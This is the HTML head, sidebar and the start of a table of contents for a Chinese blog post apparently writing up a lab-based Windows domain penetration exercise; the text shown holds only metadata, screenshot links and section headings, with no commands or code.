@@ -1,0 +1,1649 @@
+<!DOCTYPE html><html lang="en"><head><!-- hexo injector head_begin start --><link href="https://cdn.jsdelivr.net/npm/hexo-widget-tree@0.1.1/css/index.css" rel="stylesheet"/><!-- hexo injector head_begin end --><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Morouu"><meta name="copyright" content="Morouu"><meta name="generator" content="Hexo 5.4.0"><meta name="theme" content="hexo-theme-yun"><title>还行的第1次域渗透 | Morouu的大狗窝 ●'◡'●</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.24/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_ed8vp4atwoj.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
+  [".post-card",".post-content img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+});
+</script><link class="aplayer-style-marker" rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script class="aplayer-script-marker" src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" defer></script><script class="meting-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/pjax@latest/pjax.min.js" defer></script><script src="/js/pjax.js" defer></script><script src="https://cdn.jsdelivr.net/npm/vue@2.6.11"></script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="shortcut icon" type="image/svg+xml" href="/logo.jpg"><link rel="mask-icon" href="/logo.jpg" color="#0078E7"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
+    const Yun = window.Yun || {};
+    window.CONFIG = {"hostname":"morblog.cc","root":"/","title":"Morouu的大狗窝","version":"1.5.1","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"local_search":{"path":"/search.xml"},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><meta name="description" content="​    过自己想要的生活，上帝会让你付出代价，但最后，这个完整的自己，就是上帝还给你的利息。不如就稍微地学以致用把老师给的环境玩意过一遍？">
+<meta property="og:type" content="article">
+<meta property="og:title" content="还行的第1次域渗透">
+<meta property="og:url" content="https://morblog.cc/posts/14199/index.html">
+<meta property="og:site_name" content="Morouu的大狗窝 ●&#39;◡&#39;●">
+<meta property="og:description" content="​    过自己想要的生活，上帝会让你付出代价，但最后，这个完整的自己，就是上帝还给你的利息。不如就稍微地学以致用把老师给的环境玩意过一遍？">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305111513.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305092708.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305092915.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305113041.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305113231.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305140237.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305140940.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305141433.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305130804.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305131709.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305131949.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305132058.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305133002.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305133053.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305133429.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305133620.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305142640.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305152221.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305152237.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305150418.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305151142.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305153326.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305143714.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306134342.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306134554.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306135343.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306135612.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306140737.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306141127.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306141321.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305154424.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305155103.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305145137.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305165850.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306142210.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305155249.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305145820.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305155634.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306143756.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306150811.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306155048.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306155342.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306160517.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306161950.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306162316.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306162701.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306163112.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306163517.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306163741.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306164114.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306165053.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306170050.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306170318.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306180848.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306181739.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306182609.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306183330.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306183846.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306184145.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306184548.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306184829.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306185324.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306185553.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307132352.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307132522.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307132737.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307140556.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307140510.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307141653.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307142142.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307142332.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307142542.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307142728.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307142822.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307142938.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307151214.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307151520.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307141449.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307141038.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307143505.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307143150.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307143254.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307150727.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307144018.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307144315.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307144444.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307145424.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307150027.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307150135.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307150246.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307151651.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307152010.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307152703.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307153121.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307160155.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306192234.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306191902.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306192314.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306192431.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306192618.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306192847.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306194057.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306194128.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306194443.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306195548.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306200005.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307161159.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307161336.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307161623.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307162139.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307162350.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307163343.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307163604.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306201152.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306205300.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307164515.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307164718.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307164807.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307164903.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307165009.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307165034.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307173337.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="c:/Users/22929/AppData/Roaming/Typora/typora-user-images/image-20210307173902444.png">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307181926.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307182148.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307182456.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="og:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307183048.png?x-oss-process=image/auto-orient,1/interlace,1">
+<meta property="article:published_time" content="2021-03-07T10:34:54.000Z">
+<meta property="article:modified_time" content="2021-03-07T11:19:50.622Z">
+<meta property="article:author" content="Morouu">
+<meta property="article:tag" content="安全">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="域渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305111513.png?x-oss-process=image/auto-orient,1/interlace,1"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><canvas id="trianglifyContainer"></canvas><script defer src="https://cdn.jsdelivr.net/npm/trianglify@4/dist/trianglify.bundle.js"></script><script>document.addEventListener("DOMContentLoaded", () => {
+  const pattern = trianglify({
+    width: 800,
+    height: 600,
+    cellSize: 75,
+    palette: ["YlGnBu", "GnBu", "Purples", "Blues"],
+  });
+  const canvasOpts = {
+    applyCssScaling: false
+  }
+  document.body.appendChild(pattern.toCanvas(trianglifyContainer, canvasOpts));
+});</script><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Morouu"><img width="96" loading="lazy" src="/images/tx.png" alt="Morouu"><span class="site-author-status" title="即便是到了最灰暗的时候，也决不要放弃">😊</span></a><div class="site-author-name"><a href="/about/">Morouu</a></div><span class="site-name">Morouu的大狗窝 ●'◡'●</span><sub class="site-subtitle">从何时起开始害怕遥望星辰.</sub><div class="site-desciption">一个不相信命运却总想着时刻保持温柔的家伙</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">23</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">31</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">17</span></a></div><div class="site-state-item"><a href="/about/"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg></span></a></div><a class="site-state-item hty-icon-button" href="https://morblog.cc" title="文档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-settings-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://qm.qq.com/cgi-bin/qm/qr?k=fWedgqUErGcge7o_VeuMGd-rvqF6ofu0&amp;noverify=0" title="QQ 229292073" target="_blank" style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/morouu" title="GitHub" target="_blank" style="color:#6e5494"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://u.wechat.com/MD4_hJ7v3BFP-TEc54DBoS4" title="Wechat" target="_blank" style="color:#1AAD19"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-wechat-2-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:morouure@gmail.com" title="E-Mail" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:pink"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-open-arm-line"></use></svg></a><a class="links-item hty-icon-button" href="/girls/" title="我的天使们" style="color:#de4b4b"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-heart-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%98%E8%A1%8C%E7%9A%84%E5%9F%9F%E6%B8%97%E9%80%8FWP"><span class="toc-number">1.</span> <span class="toc-text">还行的域渗透WP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%9B%AE%E6%A0%87%E9%85%8D%E7%BD%AE%EF%BC%88%E5%81%87%E8%A3%85%E5%9C%A8%E5%86%85%E7%BD%91%EF%BC%89%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">一、目标配置（假装在内网）：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%9C%BA%EF%BC%9A"><span class="toc-number">1.1.0.1.</span> <span class="toc-text">- 攻击机：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%EF%BC%9A"><span class="toc-number">1.1.0.2.</span> <span class="toc-text">- 靶机：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%85%B7%E4%BD%93%E6%AD%A5%E9%AA%A4%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">二、具体步骤：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WIN2008-172-16-243-222-%EF%BC%9A"><span 